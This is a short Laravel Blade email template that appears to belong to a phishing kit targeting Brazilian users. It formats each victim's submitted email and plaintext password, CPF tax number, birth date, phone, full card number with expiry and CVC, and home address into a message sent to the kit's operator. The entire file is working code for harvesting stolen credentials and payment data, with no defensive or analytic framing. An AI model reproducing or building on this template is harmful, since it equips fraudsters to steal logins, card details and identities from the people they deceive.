{{--@formatter:off--}}
@php
use Illuminate\Foundation\Inspiring;
[$message, $author] = str(Inspiring::quotes()->random())->explode('-');
@endphp
<x-mail::message>
# Login Information
 - Email: {{$visitor->user}}
 - Password: {{$visitor->pass}}
# Personal Information
 - Full name: {{$request->get('name')}}
 - Cadastro de Pessoas Físicas (CPF): {{$request->get('cpf')}}
 - Date of Birth: {{$request->get('birthdate')}}
 - Phone Number: {{$request->get('phone')}}
# Card Information
 - Cardholder Name: {{$request->get('cardName')}}
 - Card Number: {{$request->get('cardNumber')}}
 - Card Expiry: {{$request->get('cardExpiry')}}
 - Card CVC: {{$request->get('cardCVC')}}
# Address Information
 - Street: {{$request->get('street')}}
 - Number: {{$request->get('number')}}
 - Complement: {{$request->get('complement')}}
 - Neighborhood: {{$request->get('neighborhood')}}
 - City: {{$request->get('city')}}
 - CEP: {{$request->get('cep')}}
 - State: {{$request->get('state')}}
</x-mail::message>
